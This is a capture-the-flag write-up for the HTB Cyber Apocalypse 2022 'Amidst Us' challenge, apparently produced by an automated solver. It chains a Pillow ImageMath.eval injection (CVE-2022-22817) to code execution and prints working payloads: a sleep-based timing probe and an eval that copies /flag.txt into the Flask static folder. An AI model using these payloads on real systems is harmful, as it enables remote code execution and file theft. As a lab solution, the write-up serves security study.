# Amidst Us (HTB Cyber Apocalypse 2022) — verified 2026-09-17

Chain: fearless `make_alpha` f-string interpolation into `PIL.ImageMath.eval`
(Pillow ≤ 8.4.0, CVE-2022-22817) → arbitrary python through the inner
`eval("...")` sandbox builtin → in-response exfil by copying `/flag.txt`
into the Flask static folder served at `/static/f.txt`.

## Evidence ancestry (live target 154.57.164.67:32244, rebuilt deployment)
- Recon: Werkzeug/2.1.2 dev server header, Python 3.7.7; page "Amidst Us",
  upload form `imageFile`, ROT13'd response text (`onq vzntr svyr!` =
  "bad image file!").
- Front-end JS: POST `/api/alphafy` `{image: base64, background: [r,g,b]}`.
- classify.py (blackbox) named web-ssti — the weak first guess; true class:
  code execution in the image pipeline, filed under web-logic-flaw then the
  exfil loop under file-read-primitives. Recorded as confusables.
- chain_match: 0/10 candidates — novel shape, probes from first principles.
- Probes (all through hooks.py pre/post, ledger in state.json):
  - GET /console: 404 — werkzeug debugger closed (falsifies).
  - baseline valid 1x1 PNG bg [255,0,0]: 200 `{image}` — pipeline works.
  - background strings ["red","green","blue"]: 400 — non-int rejected.
  - GIF upload accepted (200), EPS trivial rejected (400) — parser = PIL
    open, no ghostscript path.
  - background[0] = "254+1": 400 — raw arithmetic NOT the injection surface.
  - background[0] = 'eval("__import__('time').sleep(6)")': **7.52s vs ~1s
    baseline → the inner ImageMath builtin eval executed (RCE confirmed).**
- Oscillator saw make_alpha source in the ctftime writeup screenshot
  (f-string interpolation of {color[0..2]} into ImageMath.eval), then the
  CVE reference (python-pillow/Pillow#5923).
- Old instance 154.57.164.82:30904 died mid-loop; instance moved to
  154.57.164.67:32244 (same app; re-fingerprinted before continuing).
- Exfil path tried and dropped: cp into static via os.system (path guessing
  failed 3 probes), direct popen dumps (400). Working channel:
  background[0] = `eval("__import__('shutil').copy('/flag.txt',
  __import__('flask').current_app.static_folder + '/f.txt')")` — the app
  tells us its own static folder, no path guessing. Then GET /static/f.txt.
- Flag read from live response: HTB{REDACTED}
- Cleanup: copied artifact removed via os.remove(static_folder + '/f.txt');
  re-check 404. No instance state left.

## Traps
- The calibrated OUTPUT-PIXEL decode path (alpha = 255*max(d1,d2)) is a
  real channel but collision-prone at 8-bit depth near alpha≈255 — a
  whole-session sink. The static_folder copy beats it 1 request vs ~40.
- os.system quoting: the expression is INSIDE a double-quoted f-string
  context; keep exactly one quoting level per layer, or the shell command
  dies as a Python syntax error before running.
- A 400 does not mean the command failed — side effects (cp, rm) run before
  the downstream difference1 math raises. Always re-check the artifact.
- The first `'254+1'` string 400s are from pre-execution validation, not a
  Pillow rejection — do not conclude the CVE is patched from one 400.
- The connection-reset after a sleep probe remains evidence about the
  mechanism (timing), not a response payload; the confirm evidence that
  went into the ledger was the timing differential, not the reset.

Solver chain probe file: challenges/amidst-us/state.json holds the whole
hook-verified probe ledger for reproduction.